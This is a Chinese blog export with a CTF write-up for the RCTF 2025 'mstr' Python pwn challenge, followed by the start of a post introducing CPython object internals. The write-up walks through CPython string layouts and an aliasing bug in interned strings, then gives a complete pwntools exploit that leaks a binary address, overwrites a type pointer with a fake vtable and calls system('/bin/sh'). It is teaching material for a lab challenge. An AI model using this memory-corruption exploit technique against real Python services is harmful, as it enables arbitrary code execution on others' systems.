[{"title":"2025RCTF-mstr","url":"/2025/12/21/2025RCTF-mstr/","content":"\n参考：RCTF 2025 mstr Writeup - RiK’s Blog\n\n2025RCTF的一道Python PWN题。前段时间学习了两道Python PWN题（CPython PWN | HackC0der’s Blog）主要是针对Python一切皆对象的特性进行利用。\nimport ctypesfrom typing import Union, List, DictSTRPTR_OFFSET = 0x28 LENPTR_OFFSET = 0x10class MutableStr:    passclass MutableStr:    def __init__(self, data:str):        self.data = data        self.base_ptr = id(self.data)        self.max_size_str = &quot;&quot;    def set_max_size(self, max_size_str):        if int(max_size_str) &lt; ((len(self)+7) &amp; ~7):            self.max_size_str = max_size_str        else:            print(&quot;can&#x27;t set max_size: too big&quot;)    def __repr__(self):        return self.data    def __str__(self):        return self.__repr__()            def __len__(self):        if self.base_ptr is None:            return 0        ptr = ctypes.cast(self.base_ptr + LENPTR_OFFSET, ctypes.POINTER(ctypes.c_int64))        return ptr[0]        def __getitem__(self, key:int):        if not isinstance(key, int):            raise NotImplementedError        if key &gt;= len(self) or key &lt; 0:            raise RuntimeError(&quot;get overflow&quot;)                return self.data[key]    def __setitem__(self, key:int, value:int):        if not isinstance(value, int):            raise NotImplementedError(&quot;only support integer value&quot;)        if not isinstance(key, int):            raise NotImplementedError(&quot;only support integer key&quot;)        if key &gt;= len(self) or key &lt; 0:            raise RuntimeError(f&quot;set overflow: length:&#123;len(self)&#125;, key:&#123;key&#125;&quot;)                strptr = ctypes.cast(self.base_ptr + STRPTR_OFFSET, ctypes.POINTER(ctypes.c_char))        strptr[key] = value        def __add__(self, other:Union[str,MutableStr]):        if isinstance(other, str):            return MutableStr(self.data + other)                if isinstance(other, MutableStr):            return MutableStr(self.data + other.data)                raise NotImplementedError()        def _add_str(self, other):        if self.max_size_str == &quot;&quot;:            max_size = (len(self)+7) &amp; ~7        else:            max_size = int(self.max_size_str)        if len(self)+len(other) &lt;= max_size:            other_len = len(other)            strptr = ctypes.cast(self.base_ptr + STRPTR_OFFSET, ctypes.POINTER(ctypes.c_char))            otherstrptr = ctypes.cast(id(other) + STRPTR_OFFSET, ctypes.POINTER(ctypes.c_char))            for i in range(other_len):                strptr[i+len(self)] = otherstrptr[i]            if len(self)+other_len &lt; max_size:                # strptr[len(self)+other_len] = 0                 pass            ctypes.cast(self.base_ptr + LENPTR_OFFSET, ctypes.POINTER(ctypes.c_int64))[0] += other_len        else:            print(&quot;Full!&quot;)        return self        def __iadd__(self, other):        if isinstance(other, str):            return self._add_str(other)        if isinstance(other, MutableStr):            return self._add_str(other.data)        return selfdef new_mstring(data:str) -&gt; MutableStr:    return MutableStr(data)mstrings:List[MutableStr] = []def main():    while True:        try:            cmd, data, *values = input(&quot;&gt; &quot;).split()            if cmd == &quot;new&quot;:                mstrings.append(new_mstring(data))                        if cmd == &quot;set_max&quot;:                idx = int(values[0])                if idx &gt;= len(mstrings) or idx &lt; 0:                    print(&quot;invalid index&quot;)                    continue                mstrings[idx].set_max_size(data)                        if cmd == &quot;+&quot;:                idx1 = int(data)                idx2 = int(values[0])                if idx1 &lt; 0 or idx1 &gt;= len(mstrings) or idx2 &lt; 0 or idx2 &gt;= len(mstrings):                    print(&quot;invalid index&quot;)                    continue                mstrings.append(mstrings[idx1]+mstrings[idx2])            if cmd == &quot;+=&quot;:                idx1 = int(data)                idx2 = int(values[0])                if idx1 &lt; 0 or idx1 &gt;= len(mstrings) or idx2 &lt; 0 or idx2 &gt;= len(mstrings):                    print(&quot;invalid index&quot;)                    continue                mstrings[idx1] += mstrings[idx2]            if cmd == &quot;print_max&quot;:                idx = int(data)                if idx &gt;= len(mstrings) or idx &lt; 0:                    print(&quot;invalid index&quot;)                    continue                print(mstrings[idx].max_size_str)            if cmd == &quot;print&quot;:                idx = int(data)                if idx &gt;= len(mstrings) or idx &lt; 0:                    print(&quot;invalid index&quot;)                    continue                print(mstrings[idx].data)            if cmd == &quot;modify&quot;:                idx = int(data)                offset = int(values[0])                val = values[1]                                if idx &gt;= len(mstrings) or idx &lt; 0:                    print(&quot;invalid index&quot;)                    continue                mstrings[idx][offset] = int(val)        except EOFError:            break        except Exception as e:            print(f&quot;error: &#123;e&#125;&quot;)print(&quot;hello!&quot;, flush=True)main()\n\n在Python中，字符串（String）是一种不可变的数据类型。这意味着一旦创建了一个字符串对象，它的值就不能被改变。如果尝试修改字符串的内容，Python会创建一个新的字符串对象，而不是修改原有的字符串。本题基于字符串对象，利用ctype等底层接口实现了一个可边长的字符串，肯定会出现一些问题。\nPython的字符串实现\n\ntype PyASCIIObject \n\ntype PyCompactUnicodeObject \n\ntype PyUnicodeObject \nThese subtypes of PyObject represent a Python Unicode object. In almost all cases, they shouldn’t be used directly, since all API functions that deal with Unicode objects take and return PyObject pointers.\n\n\n\nPython-3.12.4/Include/cpython/unicodeobject.h\n/* --- Unicode Type ------------------------------------------------------- *//* ASCII-only strings created through PyUnicode_New use the PyASCIIObject   structure. state.ascii and state.compact are set, and the data   immediately follow the structure. utf8_length can be found   in the length field; the utf8 pointer is equal to the data pointer. */typedef struct &#123;    /* There are 4 forms of Unicode strings:       - compact ascii:         * structure = PyASCIIObject         * test: PyUnicode_IS_COMPACT_ASCII(op)         * kind = PyUnicode_1BYTE_KIND         * compact = 1         * ascii = 1         * (length is the length of the utf8)         * (data starts just after the structure)         * (since ASCII is decoded from UTF-8, the utf8 string are the data)       - compact:         * structure = PyCompactUnicodeObject         * test: PyUnicode_IS_COMPACT(op) &amp;&amp; !PyUnicode_IS_ASCII(op)         * kind = PyUnicode_1BYTE_KIND, PyUnicode_2BYTE_KIND or           PyUnicode_4BYTE_KIND         * compact = 1         * ascii = 0         * utf8 is not shared with data         * utf8_length = 0 if utf8 is NULL         * (data starts just after the structure)       - legacy string:         * structure = PyUnicodeObject structure         * test: !PyUnicode_IS_COMPACT(op)         * kind = PyUnicode_1BYTE_KIND, PyUnicode_2BYTE_KIND or           PyUnicode_4BYTE_KIND         * compact = 0         * data.any is not NULL         * utf8 is shared and utf8_length = length with data.any if ascii = 1         * utf8_length = 0 if utf8 is NULL       Compact strings use only one memory block (structure + characters),       whereas legacy strings use one block for the structure and one block       for characters.       Legacy strings are created by subclasses of Unicode.       See also _PyUnicode_CheckConsistency().    */    PyObject_HEAD    Py_ssize_t length;          /* Number of code points in the string */    Py_hash_t hash;             /* Hash value; -1 if not set */    struct &#123;        /* If interned is non-zero, the two references from the           dictionary to this object are *not* counted in ob_refcnt.           The possible values here are:               0: Not Interned               1: Interned               2: Interned and Immortal               3: Interned, Immortal, and Static           This categorization allows the runtime to determine the right           cleanup mechanism at runtime shutdown. */        unsigned int interned:2;        /* Character size:           - PyUnicode_1BYTE_KIND (1):             * character type = Py_UCS1 (8 bits, unsigned)             * all characters are in the range U+0000-U+00FF (latin1)             * if ascii is set, all characters are in the range U+0000-U+007F               (ASCII), otherwise at least one character is in the range               U+0080-U+00FF           - PyUnicode_2BYTE_KIND (2):             * character type = Py_UCS2 (16 bits, unsigned)             * all characters are in the range U+0000-U+FFFF (BMP)             * at least one character is in the range U+0100-U+FFFF           - PyUnicode_4BYTE_KIND (4):             * character type = Py_UCS4 (32 bits, unsigned)             * all characters are in the range U+0000-U+10FFFF             * at least one character is in the range U+10000-U+10FFFF         */        unsigned int kind:3;        /* Compact is with respect to the allocation scheme. Compact unicode           objects only require one memory block while non-compact objects use           one block for the PyUnicodeObject struct and another for its data           buffer. */        unsigned int compact:1;        /* The string only contains characters in the range U+0000-U+007F (ASCII)           and the kind is PyUnicode_1BYTE_KIND. If ascii is set and compact is           set, use the PyASCIIObject structure. */        unsigned int ascii:1;        /* The object is statically allocated. */        unsigned int statically_allocated:1;        /* Padding to ensure that PyUnicode_DATA() is always aligned to           4 bytes (see issue #19537 on m68k). */        unsigned int :24;    &#125; state;&#125; PyASCIIObject;/* Non-ASCII strings allocated through PyUnicode_New use the   PyCompactUnicodeObject structure. state.compact is set, and the data   immediately follow the structure. */typedef struct &#123;    PyASCIIObject _base;    Py_ssize_t utf8_length;     /* Number of bytes in utf8, excluding the                                 * terminating \\0. */    char *utf8;                 /* UTF-8 representation (null-terminated) */&#125; PyCompactUnicodeObject;/* Object format for Unicode subclasses. */typedef struct &#123;    PyCompactUnicodeObject _base;    union &#123;        void *any;        Py_UCS1 *latin1;        Py_UCS2 *ucs2;        Py_UCS4 *ucs4;    &#125; data;                     /* Canonical, smallest-form Unicode buffer */&#125; PyUnicodeObject;PyAPI_FUNC(int) _PyUnicode_CheckConsistency(    PyObject *op,    int check_content);#define _PyASCIIObject_CAST(op) \\    (assert(PyUnicode_Check(op)), \\     _Py_CAST(PyASCIIObject*, (op)))#define _PyCompactUnicodeObject_CAST(op) \\    (assert(PyUnicode_Check(op)), \\     _Py_CAST(PyCompactUnicodeObject*, (op)))#define _PyUnicodeObject_CAST(op) \\    (assert(PyUnicode_Check(op)), \\     _Py_CAST(PyUnicodeObject*, (op)))\n\n\n\n\n结构体\n核心特征\n适用场景\n\n\n\nPyASCIIObject\n最基础的结构。用于存储纯 ASCII 字符（码点 U+0000 到 U+007F）。数据紧随结构体之后，采用单内存块的紧凑分配方式。state.ascii和 state.compact标志位均设为 1。\n例如 &quot;hello&quot;这样的纯英文文本。\n\n\nPyCompactUnicodeObject\n继承自 PyASCIIObject。用于存储包含非 ASCII 字符的字符串。增加了 utf8_length和 *utf8指针，用于缓存字符串的 UTF-8 编码形式，提升编码效率。同样采用紧凑分配。\n例如包含中文 &quot;你好&quot;或拉丁字符 &quot;café&quot;的字符串。\n\n\nPyUnicodeObject\n继承自 PyCompactUnicodeObject。主要被 Unicode 子类 或称为 传统字符串（Legacy String） 的对象使用。它包含一个 data联合体（union），明确指向不同编码（如 UCS1、UCS2、UCS4）的数据缓冲区。通常使用两个独立的内存块（结构体一块，数据一块）。\n通常由用户自定义的字符串子类创建。\n\n\n关键机制：state位域与字符存储宽度：\nPyASCIIObject中的 state位域是控制字符串存储和行为的关键，它使用位字段来节省内存。\n\ninterned:2: 指示字符串是否被 驻留（interned）。驻留是一种优化机制，对内容相同的字符串只保留一个副本，通过 is关键字可以验证其身份一致性。其值可以是 0（未驻留）、1（已驻留）、2（已驻留且永生）等。\nkind:3: 这是最重要的字段之一，它定义了每个字符在内存中占用的字节数，直接影响内存使用和能表示的字符范围。 PyUnicode_1BYTE_KIND (1): 每个字符占 1 字节。可表示 Latin-1 编码范围内的所有字符（U+0000 到 U+00FF）。如果字符串中所有字符都在 ASCII 范围内（U+0000 到 U+007F），则 ascii标志为 1。 PyUnicode_2BYTE_KIND (2): 每个字符占 2 字节。可表示基本多文种平面（BMP）的所有字符（U+0000 到 U+FFFF），包括绝大多数常用汉字。 PyUnicode_4BYTE_KIND (4): 每个字符占 4 字节。可以表示整个 Unicode 范围内的字符（U+0000 到 U+10FFFF），包括一些表情符号（emoji）和罕见字符。\ncompact:1: 表明字符串对象是否采用紧凑内存布局（结构体和字符数据在同一块连续内存中）。PyASCIIObject和 PyCompactUnicodeObject通常是紧凑的（值为 1），而 PyUnicodeObject通常不是（值为 0）。\nascii:1: 表明字符串是否仅包含 ASCII 字符。这是基于字符码点的快速判断标志。\n\n\n二、永生对象回到题目，我们输出一些变量数值以便调试：\n&gt; new 123_abctype self:&lt;class &#x27;__main__.MutableStr&#x27;&gt;self id:0x79c6159c41a0data id:0x79c6159f4f90self.data id:0x79c6159f4f90self.data type:&lt;class &#x27;str&#x27;&gt;self.base_ptr:0x79c6159f4f90self.base_ptr id:0x79c6159d0c80==========================&gt; new 123_abctype self:&lt;class &#x27;__main__.MutableStr&#x27;&gt;self id:0x79c6159c6b30data id:0x79c6159f74c0self.data id:0x79c6159f74c0self.data type:&lt;class &#x27;str&#x27;&gt;self.base_ptr:0x79c6159f74c0self.base_ptr id:0x79c6159d1080==========================&gt; new atype self:&lt;class &#x27;__main__.MutableStr&#x27;&gt;self id:0x79c6159c6a40data id:0x649d0178a938self.data id:0x649d0178a938self.data type:&lt;class &#x27;str&#x27;&gt;self.base_ptr:0x649d0178a938self.base_ptr id:0x79c6159d1300==========================&gt; new atype self:&lt;class &#x27;__main__.MutableStr&#x27;&gt;self id:0x79c6159c4100data id:0x649d0178a938self.data id:0x649d0178a938self.data type:&lt;class &#x27;str&#x27;&gt;self.base_ptr:0x649d0178a938self.base_ptr id:0x79c6159cbfc0==========================\n\n简单来说，似乎&quot;a&quot;被“驻留”了（？），所以每次 new a时，data都指向同一个字符串对象（data id相同）；而 &quot;123_abc&quot;没有被“驻留”，每次 new 123_abc都会创建一个新的字符串对象。下面是ai的解释：\n\nPython 的字符串驻留机制主要为了优化性能和内存，但并非所有字符串都会被驻留。它主要发生在以下情况：\n\n编译期确定的字符串：在代码编译阶段就能确定的字符串字面量更可能被驻留。你的代码中，通过 input().split()动态生成的字符串属于运行时创建，驻留条件更为严格。\n符合标识符规则的字符串：由字母、数字和下划线 _组成的字符串，因为它们很可能被用作变量名、函数名等标识符，重复使用率高。你的 &quot;123_abc&quot;虽然符合此规则，但因为是运行时动态输入，可能未被驻留。\n长度很短的字符串：长度為 0 或 1 的字符串几乎总是被驻留。这就是为什么单字符 &quot;a&quot;被驻留了\n\n\n然而，通过gdb调试我们可以发现奇怪的一幕——“a”的state.interned == 0——但是state.statically_allocated = 1\n\n\n——这是为什么，难道不是驻留机制吗？为什么没有置位？看看AI的回答与总结：\n\n永生对象（Immortal Objects）是 CPython 解释器内部一种特殊的对象，其核心特性是引用计数永远不会减为零，因此也永远不会被垃圾回收器销毁。这项特性主要是为了支持多解释器环境而引入的，旨在解决特定场景下的性能和安全问题。\n在 CPython 中，每个对象都有一个引用计数字段（通常是 32 位或 64 位无符号整数）。永生对象的实现方式是将这个引用计数值设置为一个特定的、不可能通过正常引用操作达到的极大值（例如 32 位无符号整数的最大值 0xFFFFFFFF）。\n这样一来，Py_INCREF()和 Py_DECREF()这类管理引用计数的宏在操作对象时，会先检查其引用计数值。如果发现该值已经是这个特殊的极大值，就会跳过实际的增加或减少操作，因为解释器知道这个对象是永生的，无需管理其生命周期\n目前，Python 内置的一些不可变对象通常是永生的，例如：\n\nNone, True, False\n小整数（通常是一个预先定义好的范围，如 -5 到 256）\n一些常用的字符串（空字符串、单个字符等也可能被驻留并设置为永生）\n\n永生对象不通过常规的“驻留字典”来管理，因此它的 interned标志位是 0，但它通过更底层的“静态分配”机制实现了全局唯一，从而被所有变量共享。\n下面这个表格清晰地展示了普通驻留对象与你遇到的永生对象在内部机制上的核心区别：\n\n\n\n特性\n普通驻留对象\n永生对象\n\n\n\nstate.interned标志位\nSSTATE_INTERNED_MORTAL(通常为 1)\nSSTATE_NOT_INTERNED(0)\n\n\nstate.statically_allocated标志位\n0\n1\n\n\n管理机制\n由全局 interned字典管理\n在 Python 解释器初始化时被静态分配，并永久存在\n\n\n生命周期\n可被垃圾回收（在清理驻留池时）\n永生，与 Python 解释器生命周期相同，永不释放\n\n\n典型例子\n运行时创建的符合规则的标识符\n短小的拉丁字母字符、数字、None、True、False等\n\n\n\n特性参考：PEP 683 – 不朽对象，使用固定引用计数 | peps.python.org - Python 增强提案\n\nPython的字符串是静态不可修改的，本题则提供了一个能够从底层修改字符串的操作，因此不由得进行思考：\n永生对象意味着同一个变量在许多位置被引用，而如果永生对象发生了变化，则会导致全局的该永生对象的引用位置的值均发生改变。\n\n试想：interned被置位的对象，是否有类似的特性？\n\n三、字符编码长度  def _add_str(self, other):...      if len(self)+len(other) &lt;= max_size:\t...          ctypes.cast(self.base_ptr + LENPTR_OFFSET, ctypes.POINTER(ctypes.c_int64))[0] += other_len      else:\t...      return self\n\n注意到字符串相加函数实现中，有一行代码修改字符串对象偏移STRPTR_OFFSET = 0x28的位置。\nSTRPTR_OFFSET = 0x28是因为字符串对象结构体sizeof(PyASCIIObject) == 0x28，而字符串变量与结构体对象相邻存放在后面。似乎这个偏移是合理的？——但字符串实现不只有PyASCIIObject，**PyCompactUnicodeObject结构体继承自PyASCIIObject，新增了utf8_length和 *utf8指针，用于缓存字符串的 UTF-8 编码形式，提升编码效率；PyUnicodeObject**结构体继承自PyCompactUnicodeObject，包含一个 data联合体（union），明确指向不同编码（如 UCS1、UCS2、UCS4）的数据缓冲区。\n我们来动手调试一下：\nhello!&gt; $ new 你好[DEBUG] Sent 0xb bytes:    00000000  6e 65 77 20  e4 bd a0 e5  a5 bd 0a                  │new │····│···│    0000000b[DEBUG] Received 0xe9 bytes:    b&quot;type self:&lt;class &#x27;__main__.MutableStr&#x27;&gt;\\n&quot;    b&#x27;self id:0x750d39fc5aa0\\n&#x27;    b&#x27;data id:0x750d39fe2560\\n&#x27;    b&#x27;self.data id:0x750d39fe2560\\n&#x27;    b&quot;self.data type:&lt;class &#x27;str&#x27;&gt;\\n&quot;    b&#x27;self.base_ptr:0x750d39fe2560\\n&#x27;    b&#x27;self.base_ptr id:0x750d39fd0080\\n&#x27;    b&#x27;==========================\\n&#x27;    b&#x27;&gt; &#x27;type self:&lt;class &#x27;__main__.MutableStr&#x27;&gt;self id:0x750d39fc5aa0data id:0x750d39fe2560self.data id:0x750d39fe2560self.data type:&lt;class &#x27;str&#x27;&gt;self.base_ptr:0x750d39fe2560self.base_ptr id:0x750d39fd0080==========================&gt; $ print 0[DEBUG] Sent 0x8 bytes:    b&#x27;print 0\\n&#x27;[DEBUG] Received 0x9 bytes:    00000000  e4 bd a0 e5  a5 bd 0a 3e  20                        │····│···&gt;│ │    00000009你好----------------------------pwndbg&gt; p *(PyCompactUnicodeObject *)0x750d39fe2560$1 = &#123;  _base = &#123;    ob_base = &#123;      &#123;        ob_refcnt = 1,        ob_refcnt_split = &#123;1, 0&#125;      &#125;,      ob_type = 0x59cd3cf0ffc0 &lt;PyUnicode_Type&gt;    &#125;,    length = 2,    hash = -1,    state = &#123;      interned = 0,      kind = 2,      compact = 1,      ascii = 0,      statically_allocated = 0    &#125;  &#125;,  utf8_length = 0,  utf8 = 0x0&#125;pwndbg&gt; tele 0x750d39fe256000:0000│  0x750d39fe2560 ◂— 101:0008│  0x750d39fe2568 —▸ 0x59cd3cf0ffc0 (PyUnicode_Type) ◂— 0xffffffff02:0010│  0x750d39fe2570 ◂— 203:0018│  0x750d39fe2578 ◂— 0xffffffffffffffff04:0020│  0x750d39fe2580 ◂— 0xcdcdcdcdcdcdcd2805:0028│  0x750d39fe2588 ◂— 006:0030│  0x750d39fe2590 ◂— 007:0038│  0x750d39fe2598 ◂— 0xfdfd0000597d4f60 /* &#x27;`O&#125;Y&#x27; */\n\n依据我们之前对state的含义：\n\n\n\n字段\n值\n含义解释\n\n\n\ninterned\n0\n此字符串未启用 intern 机制（即未被放入全局共享池）。\n\n\nkind\n2\n字符串的编码为 PyUnicode_2BYTE_KIND (UCS-2)，每个字符使用 2 字节 存储。\n\n\ncompact\n1\n字符串采用紧凑内存布局，对象头和数据区存储在同一块连续内存中。\n\n\nascii\n0\n字符串中包含非 ASCII 字符（例如中文、特殊符号等）。\n\n\nstatically_allocated\n0\n该字符串对象是动态分配的（运行时创建），而非在解释器启动时静态预分配的永生对象。\n\n\ncompact字段为1，意味着字符串内容紧跟在结构体后：\n07:0038│  0x750d39fe2598 ◂— 0xfdfd0000597d4f60 /* &#x27;`O&#125;Y&#x27; */\n\n看起来&quot;你好&quot;似乎对应着0x597d4f60——length = 2，kind = 2，因此实际需要2*2=4个字节来存储。找个转换网站看一下：\n\n\n如果是字符串&quot;你好123abc&quot;也同理：\n07:0038│  0x750d39fe4cb8 ◂— 0x00320031597d4f60 /* &#x27;`O&#125;Y1&#x27; */08:0040│  0x750d39fe4cc0 ◂— 0x0063006200610033 /* &#x27;3&#x27; */\n\n观察我们接收到的字符：\n&gt; $ print 0[DEBUG] Sent 0x8 bytes:    b&#x27;print 0\\n&#x27;[DEBUG] Received 0x9 bytes:    00000000  e4 bd a0 e5  a5 bd 0a 3e  20                        │····│···&gt;│ │    00000009你好&gt; $  \n\n并不是如其存储的那样使用UCS-2编码格式，而是考量传输和统一编解码规范，使用utf-8：\n\n\n\n\n至此，我们对包含非ASCII字符、PyCompactUnicodeObject类型的字符串对象有了基本的认识。\n除此之外还需要注意的是，PyCompactUnicodeObject类在继承PyASCIIObject类的同时，还新增了utf8_length和utf8两个结构体成员。\n四、exploit关注到MutableStr对象的max_size_str属性类型也是字符串——这意味着创建一个字面值为数值0~9的单个字节的字符串，其字面值与max_size_str相同，则该（同一个或两个不同的）MutableStr的data和max_size_str将指向同一个驻留字符串。而当我们修改data时，max_size_str也会被修改，为溢出提供了可能。\ndef set_max_size(self, max_size_str):    if int(max_size_str) &lt; ((len(self)+7) &amp; ~7):        self.max_size_str = max_size_str    else:        print(&quot;can&#x27;t set max_size: too big&quot;)\n\nhello!&gt; new 111&gt; print_max 0&gt; new 6&gt; set_max 6 0&gt; print_max 06&gt; += 1 1&gt; print 166&gt; print_max 066\n\n然后通过+=我们可以进行几乎任意长度的溢出！同时通过modify实现精确修改，溢出写任意值：\ndef modify(idx: int, offset: int, val: int):    &quot;&quot;&quot;修改指定索引字符串的特定位置字符&quot;&quot;&quot;    io.sendlineafter(b&quot;&gt; &quot;, b&quot;modify &quot; + str(idx).encode() + b&quot; &quot; + str(offset).encode() + b&quot; &quot; + str(val).encode())    def write(idx,content,offset=7,passer=8):    for i in range(len(content)):        modify(passer,i+offset,int(content[i]))    plusequal(idx,passer)    #例如，利用index==7的块作为passer对块3进行写...new(b&quot;\\x00&quot;*(0x7+0x16)) #7write(3,b&#x27;,bin/sh\\x00&#x27;+p64(elf.address+0x6752e8),offset=7,passer=7)\n\n然而我们需要一些有用的地址，来布置指针——利用PyCompactUnicodeObject与PyASCIIObject类型的混淆——对于PyCompactUnicodeObject对象，通过+=在内存拼接字符的同时，对象的length也会等量增加——而PyCompactUnicodeObject打印时会先对2*length大小的内存做转换！\n#编码转换函数def f(b):return b.decode(&#x27;utf-8&#x27;).encode(&#x27;utf-16le&#x27;).hex()#leaknew(&quot;你好&quot;.encode()) #0new(b&quot;6&quot;) #1set_max(6,0)plusequal(1,1)plusequal(1,1)plusequal(0,2)print_str(0)rcv = f(io.recvline())print(rcv)#你会得到：604f7d59000000000100000000000000a06b29ea9e570000a00，进一步解析可提取一个elf_base指针\n\n然后就很简单了（参考上一篇博客）：\n\n任意地址写布置一个fake_vtable，_repr_设为system，头部设置?bin/sh其中?通过实际调试获得\n\n布置obj的ob_type指向fake_vtable\n\nprint(obj)\n\n\nfrom pwn import *context(log_level=&#x27;debug&#x27;)io = process([&quot;/home/hacker/Desktop/2025RCTF/attachment-mstr/mstr/python-bin/bin/python3&quot;,&quot;/home/hacker/Desktop/2025RCTF/attachment-mstr/mstr/mstr.py&quot;])elf = ELF(&quot;/home/hacker/Desktop/2025RCTF/attachment-mstr/mstr/python-bin/bin/python3&quot;)def f(b):return b.decode(&#x27;utf-8&#x27;).encode(&#x27;utf-16le&#x27;).hex()def new(s: bytes):    &quot;&quot;&quot;创建新的可变字符串&quot;&quot;&quot;    io.sendlineafter(b&quot;&gt; &quot;, b&quot;new &quot; + s)    # a=io.recvuntil(b&quot;==========================&quot;)def set_max(max_size: int, idx: int):    &quot;&quot;&quot;设置指定索引字符串的最大大小&quot;&quot;&quot;    io.sendlineafter(b&quot;&gt; &quot;, b&quot;set_max &quot; + str(max_size).encode() + b&quot; &quot; + str(idx).encode())def plus(idx1: int, idx2: int):    &quot;&quot;&quot;将两个字符串相加并创建新对象&quot;&quot;&quot;    io.sendlineafter(b&quot;&gt; &quot;, b&quot;+ &quot; + str(idx1).encode() + b&quot; &quot; + str(idx2).encode())def plusequal(idx1: int, idx2: int):    &quot;&quot;&quot;将第二个字符串追加到第一个字符串&quot;&quot;&quot;    io.sendlineafter(b&quot;&gt; &quot;, b&quot;+= &quot; + str(idx1).encode() + b&quot; &quot; + str(idx2).encode())def print_max(idx: int):    &quot;&quot;&quot;打印指定索引字符串的最大大小&quot;&quot;&quot;    io.sendlineafter(b&quot;&gt; &quot;, b&quot;print_max &quot; + str(idx).encode())def print_str(idx: int):    &quot;&quot;&quot;打印指定索引字符串的内容&quot;&quot;&quot;    io.sendlineafter(b&quot;&gt; &quot;, b&quot;print &quot; + str(idx).encode())def modify(idx: int, offset: int, val: int):    &quot;&quot;&quot;修改指定索引字符串的特定位置字符&quot;&quot;&quot;    io.sendlineafter(b&quot;&gt; &quot;, b&quot;modify &quot; + str(idx).encode() + b&quot; &quot; + str(offset).encode() + b&quot; &quot; + str(val).encode())def write(idx,content,offset=7,passer=8):    for i in range(len(content)):        modify(passer,i+offset,int(content[i]))    plusequal(idx,passer)local = 1def dbg(str=&quot;&quot;):    if local:        gdb.attach(io,str)def main():    new(&quot;你好&quot;.encode()) #0    print_str(0)    new(b&quot;6&quot;) #1 +0x10d138    new(b&#x27;\\x00&#x27;*10) #2     new(b&quot;0&quot;) #3    new(b&quot;9&quot;) #4    new(b&quot;\\x00&quot;*(0x7+0x90)) #5    new(b&quot;1&quot;) #6    new(b&quot;\\x00&quot;*(0x7+0x16)) #7    set_max(6,6)    set_max(6,3)    set_max(6,4)    set_max(6,0)    plusequal(1,1)    plusequal(1,1)    plusequal(0,2)    print_str(0)    rcv = f(io.recvline())    print(rcv)    # 解析leak addr    rcv1 = rcv[len(&#x27;604f7d59000000000100000000000000a06b29ea9e570000&#x27;)-16:len(&#x27;604f7d59000000000100000000000000a06b29ea9e570000&#x27;)]    print(rcv1)    input()    PyUnicode_Type_addr = int(&#x27;&#x27;.join([rcv1[i:i+2] for i in range(0, 16, 2)][::-1]), 16)    if(PyUnicode_Type_addr &amp; 0xfff == 0xba0):        PyUnicode_Type_addr = PyUnicode_Type_addr + 0x1b400    success(f&quot;PyUnicode_Type_addr = &#123;hex(PyUnicode_Type_addr)&#125;&quot;)    elf.address = PyUnicode_Type_addr-elf.sym[&#x27;PyUnicode_Type&#x27;]    success(f&quot;elf.address = &#123;hex(elf.address)&#125;&quot;)    success(f&quot;system = &#123;hex(elf.sym[&#x27;system&#x27;])&#125;&quot;)    print_max(0)    # set fake vtable    write(3,b&#x27;,bin/sh\\x00&#x27;+p64(elf.address+0x6752e8),offset=7,passer=7)    write(4,p64(4)+p64(0)*0x10+p64(elf.sym[&#x27;system&#x27;]),offset=7,passer=5)    success(f&quot;first = &#123;hex(elf.address+0x675138)&#125;&quot;)    new(b&quot;1&quot;)#8    dbg(&quot;b PyObject_Str\\nc&quot;)    print_str(8)if __name__ == &quot;__main__&quot;:    main()    io.interactive()\n\n\n\n\n奇怪的是，我也开了aslr等等，但是攻击成功率却很高——10&#x2F;10\n简单分析一下：通过字符解析混淆leak出来的是一个elf指针，而后所有的指针操作都基于该指针，因此受地址随机化影响很小\n\n"},{"title":"CPython PWN","url":"/2025/12/01/CPython-PWN/","content":"\n1、DUCTF 2025: “FakeObject” — DUCTF 2025: “FakeObject”\n\n一、Python 的底层工作原理（CPython）Python 是一种解释型语言，其官方实现 CPython 本身是一个用 C 语言编写的大型程序。当我们运行 Python 脚本时，实际上是这个 C 程序（即 Python 解释器）在读取你的代码并执行。值得注意的是：CPython API 的代码库在不同版本之间可能会有很大的差异，所以虽然基本原理应该保持不变，但实际实现并不总是相同的！所以具体问题要具体分析~\n（一）变量和 PyObject在 CPython 中，一切皆对象。每个变量、整数、字符串、字典等，在底层都是一个 C 语言的结构体（struct）。这些结构体都有一个共同的基础头（header），即 PyObject 结构。\n\n参考：类型对象 — Python 3.10.19 文档\n\n关键结构体定义：\n// 最基本的对象结构typedef struct _object &#123;    _PyObject_HEAD_EXTRA // 用于调试的宏，通常可忽略    Py_ssize_t ob_refcnt;  // 引用计数，用于垃圾回收    PyTypeObject *ob_type; // 指向类型对象的指针，至关重要！    //PyObject * _ob_next; // 可选的调试字段，仅在定义了宏 Py_TRACE_REFS 时存在：    //PyObject * _ob_prev; // 可选的调试字段，仅在定义了宏 Py_TRACE_REFS 时存在    // 跟踪所有活动对象：当启用 Py_TRACE_REFS 时，所有 Python 对象都会被链接到一个全局的双向链表中    // 内存泄漏检测：可以查看程序运行期间哪些对象没有被正确释放    // 引用计数调试：帮助诊断引用计数相关的问题&#125; PyObject;\n\n\nPyObject.ob_refcnt：这是类型对象的引用计数，由 PyObject_HEAD_INIT 宏初始化为 1。 请注意对于 静态分配的类型对象，类型的实例 (对象的 ob_type 指回该类型) 不会 被加入引用计数。 但对于 动态分配的类型对象，实例 确实 会被算作引用。\nPyObject.ob_type：它指向一个 PyTypeObject，类似于 c 语言中的 vtable\n\n当定义一个对象（即使是原始类型），该对象将在内存中以某种形式的结构创建。它通常扩展 PyObject 结构，但如果它是一个涉及长度的对象（例如列表），也可以扩展 PyVarObject。\n继承示例：PyListObject\n// 用于表示有长度概念的对象（如列表、字符串、字典）typedef struct &#123;    PyObject ob_base;    // 继承自 PyObject，包含 ob_refcnt 和 ob_type    Py_ssize_t ob_size;  // 对象中元素的数量（例如列表的长度）&#125; PyVarObject;typedef struct &#123;    PyVarObject ob_base; // 包含 PyObject 和 ob_size    PyObject **ob_item;   // 指向列表元素指针数组的指针    Py_ssize_t allocated; // 列表实际分配的内存空间&#125; PyListObject;\n\n这种设计使得任何 Python 对象都可以被安全地向上转型（cast）为 PyObject* 指针，因为它们的起始部分内存布局是一致的。这为后续的漏洞利用提供了可能性。一些 Python 类型及其特定结构的例子：\n\n字典有  PyDictObject\n元组有 PyTupleObject\n字符串有 PyUnicodeObject\n浮点数有 PyFloatObject\n此外，通常从类型中就能很直接地找到结构体的名称\n\n（二）PyTypeObjectPyObject 中的 ob_type 字段是一个指向 PyTypeObject 结构体的指针。这个 PyTypeObject 可以理解为 对象的“类”或“蓝图”，它定义了该类型对象的通用行为和属性。\nPyTypeObject 的作用类似于 C++ 